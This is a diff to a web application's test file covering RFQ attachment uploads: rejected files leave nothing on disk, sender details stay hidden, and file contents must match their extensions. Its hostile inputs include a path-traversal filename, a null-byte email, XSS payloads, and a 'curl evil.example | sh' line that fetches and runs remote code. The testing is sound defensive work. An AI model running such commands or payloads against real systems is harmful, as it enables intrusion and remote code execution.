@@ -388,7 +388,7 @@ test("hard ceiling on the upload folders: at UPLOAD_DIR_MAX_MB new files are ref
   assert.ok(/quotes@/.test(r.body.error) && !/disk|storage|MB/i.test(r.body.error), `the customer is told what to do, not about our disk: ${r.body.error}`);
   assert.deepStrictEqual(s.files("uploads"), ["old-part.stl"], "nothing new was written");
   // The same ceiling guards the RFQ attachment.
-  const rfq = await s.upload([{ field: "drawing", name: "print.pdf", data: pdf }], { url: "/api/rfq", ip: "203.0.113.20", fields: { contactName: "A Buyer", email: "buyer@example.com" } });
+  const rfq = await s.rfq({ contactName: "A Buyer", email: "buyer@example.com" }, [{ name: "print.pdf", data: pdf }], { ip: "203.0.113.20" });
   assert.strictEqual(rfq.status, 503, rfq.text);
   assert.deepStrictEqual(s.files("rfq-drawings"), ["old-drawing.pdf"]);
   // The rest of the site is unaffected.
@@ -445,19 +445,106 @@ test("RFQ attachment: stored under a server name; type list enforced; request wi
   const s = await startA();
   const me = ip();
   const fields = { contactName: "A Buyer", email: "buyer@example.com", notes: "two off" };
-  const ok = await s.upload([{ field: "drawing", name: "../../../etc/print.pdf", data: pdf }], { url: "/api/rfq", ip: me, fields });
+  const ok = await s.rfq(fields, [{ name: "../../../etc/print.pdf", data: pdf }], { ip: me });
   assert.strictEqual(ok.status, 201, ok.text);
   const kept = s.files("rfq-drawings");
   assert.strictEqual(kept.length, 1);
   assert.ok(/^[0-9a-f-]{36}\.pdf$/.test(kept[0]), `stored as ${kept[0]}`);
   const view = await s.get(`/api/rfq/${ok.body.rfqId}`, { ip: me });
   assert.ok(!view.text.includes(s.tmp) && !("drawingPath" in view.body), "the stored path is never sent to the customer");
+  // A request sent without an account shows its status to whoever holds the id, and nothing about the sender (R3).
+  assert.deepStrictEqual(Object.keys(view.body).sort(), ["createdAt", "id", "reference", "requestType", "status"]);
+  assert.ok(!/buyer@example\.com|A Buyer|two off|print\.pdf/.test(view.text), view.text);
 
-  const bad = await s.upload([{ field: "drawing", name: "tool.exe", data: pdf }], { url: "/api/rfq", ip: me, fields });
+  const bad = await s.rfq({ ...fields, notes: "exe" }, [{ name: "tool.exe", data: pdf }], { ip: me });
   assert.strictEqual(bad.status, 400, bad.text);
-  const html = await s.upload([{ field: "drawing", name: "page.html", data: pdf }], { url: "/api/rfq", ip: me, fields });
+  const html = await s.rfq({ ...fields, notes: "html" }, [{ name: "page.html", data: pdf }], { ip: me });
   assert.strictEqual(html.status, 400);
   assert.strictEqual(s.files("rfq-drawings").length, 1, "refused types are not kept");
+  // The request without a name is refused, and so is one without its form token: neither leaves a file.
+  const noName = await s.rfq({ email: "buyer@example.com" }, [{ name: "print.pdf", data: pdf }], { ip: me });
+  assert.strictEqual(noName.status, 400, noName.text);
+  const noToken = await s.upload([{ field: "drawing", name: "print.pdf", data: pdf }], { url: "/api/rfq", ip: me, fields: { ...fields, notes: "no token" } });
+  assert.deepStrictEqual([noToken.status, noToken.body.code], [400, "form-token-missing"]);
+  assert.strictEqual(s.files("rfq-drawings").length, 1);
+});
+
+test("RFQ attachment: a refused request leaves nothing on disk, whatever refused it (R1)", async () => {
+  const s = await startA();
+  const me = ip();
+  const before = s.files("rfq-drawings").slice().sort();
+  const still = (why) => assert.deepStrictEqual(s.files("rfq-drawings").slice().sort(), before, `a file was left behind after: ${why}`);
+  const file = [{ name: "print.pdf", data: pdf }];
+  const base = { contactName: "A Buyer", email: "buyer@example.com" };
+
+  let r = await s.rfq({ email: "buyer@example.com", notes: "r1 no name" }, file, { ip: me });
+  assert.strictEqual(r.status, 400); still("no name");
+  r = await s.rfq({ contactName: "A Buyer", email: "not-an-address", notes: "r1 bad email" }, file, { ip: me });
+  assert.strictEqual(r.status, 400); still("bad email");
+  r = await s.rfq({ ...base, notes: "r1 control char", email: "buyer@example.com\u0000.evil.example" }, file, { ip: me });
+  assert.strictEqual(r.status, 400); still("an address with a control character");
+  r = await s.rfq({ ...base, notes: "r1 unknown quote", quoteId: "00000000-0000-4000-8000-000000000000" }, file, { ip: me });
+  assert.strictEqual(r.status, 404); still("unknown quote");
+  r = await s.upload([{ field: "drawing", name: "print.pdf", data: pdf }], { url: "/api/rfq", ip: me, fields: { ...base, notes: "r1 no token" } });
+  assert.strictEqual(r.status, 400); still("no form token");
+  r = await s.rfq({ ...base, notes: "r1 too fast" }, file, { ip: me, headers: { "X-Form-Token": s.formToken("rfq", 500) } });
+  assert.deepStrictEqual([r.status, r.body.code], [400, "too-fast"]); still("sent faster than a person");
+  r = await s.rfq({ ...base, notes: "r1 wrong form" }, file, { ip: me, headers: { "X-Form-Token": s.formToken("register") } });
+  assert.strictEqual(r.status, 400); still("another form's token");
+  // The honeypot answers like a success and keeps nothing.
+  r = await s.rfq({ ...base, notes: "r1 honeypot", website: "https://spam.example" }, file, { ip: me });
+  assert.strictEqual(r.status, 201); still("honeypot filled");
+  assert.strictEqual((await s.get(`/api/rfq/${r.body.rfqId}`, { ip: me })).status, 404, "no request was stored for it");
+  // The same request twice (a double click): one row, one file.
+  const first = await s.rfq({ ...base, notes: "r1 double click" }, file, { ip: me });
+  assert.strictEqual(first.status, 201, first.text);
+  const afterFirst = s.files("rfq-drawings").length;
+  assert.strictEqual(afterFirst, before.length + 1);
+  const again = await s.rfq({ ...base, notes: "r1 double click" }, file, { ip: me });
+  assert.deepStrictEqual([again.status, again.body.duplicate, again.body.rfqId], [201, true, first.body.rfqId]);
+  assert.strictEqual(s.files("rfq-drawings").length, afterFirst, "the repeat's attachment was not kept");
+});
+
+test("RFQ attachment: the contents must match the extension, as for CAD uploads and drawings (R2)", async () => {
+  const s = await startA();
+  const me = ip();
+  const before = s.files("rfq-drawings").length;
+  const fields = (n) => ({ contactName: "A Buyer", email: `buyer${n}@example.com`, notes: `content check ${n}` });
+  const png = fs.readFileSync(path.join(live.ROOT, "client", "public", "apple-touch-icon.png"));
+  const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]), Buffer.from("JFIF\0"), Buffer.alloc(64)]);
+  const webp = Buffer.concat([Buffer.from("RIFF"), Buffer.from([0x40, 0, 0, 0]), Buffer.from("WEBPVP8 "), Buffer.alloc(56)]);
+  const heic = Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from("ftypheic"), Buffer.alloc(40)]);
+  const dwg = Buffer.concat([Buffer.from("AC1027"), Buffer.alloc(64)]);
+  const dxfFile = fs.readFileSync(path.join(parts, "dxf_inch_guard.dxf"));
+  const page = Buffer.from("<!doctype html><html><body><script>alert(document.domain)</script></body></html>");
+  const hostile = [
+    ["an HTML page named .pdf", "invoice.pdf", page],
+    ["an HTML page named .png", "photo.png", page],
+    ["a script named .jpg", "photo.jpg", Buffer.from("#!/bin/sh\ncurl evil.example | sh\n")],
+    ["a PDF named .png", "drawing.png", pdf],
+    ["a Windows program named .dwg", "part.dwg", Buffer.concat([Buffer.from("MZ"), Buffer.alloc(120)])],
+    ["a DWG named .dxf", "part.dxf", dwg],
+    ["a ZIP named .heic", "IMG_0001.heic", Buffer.concat([Buffer.from("PK\u0003\u0004"), Buffer.alloc(60)])],
+    ["a PNG named .webp", "photo.webp", png],
+    ["an SVG with script named .jpeg", "logo.jpeg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')],
+    ["an empty .pdf", "empty.pdf", Buffer.alloc(0)],
+  ];
+  let n = 0;
+  for (const [what, name, data] of hostile) {
+    const r = await s.rfq(fields(++n), [{ name, data }], { ip: ip() });
+    assert.strictEqual(r.status, 400, `${what} → ${r.status} ${r.text.slice(0, 120)}`);
+    assert.strictEqual(r.body.code, "content-mismatch", what);
+    assert.strictEqual(s.files("rfq-drawings").length, before, `${what} was deleted before the answer`);
+  }
+  // Each accepted type, genuine, is still taken.
+  const genuine = [["print.pdf", pdf], ["photo.png", png], ["photo.jpg", jpeg], ["photo.JPEG", jpeg], ["photo.webp", webp], ["IMG_0002.HEIC", heic], ["part.dwg", dwg], ["outline.dxf", dxfFile]];
+  for (const [name, data] of genuine) {
+    const r = await s.rfq(fields(++n), [{ name, data }], { ip: ip() });
+    assert.strictEqual(r.status, 201, `${name} → ${r.status} ${r.text.slice(0, 160)}`);
+  }
+  assert.strictEqual(s.files("rfq-drawings").length, before + genuine.length);
+  // Nothing was stored for the refused ones, and nothing refused reached the shop's log as a name or a path.
+  assert.ok(!s.log().includes("invoice.pdf") && !s.log().includes("alert(document.domain)"));
 });
 
 run(async () => {
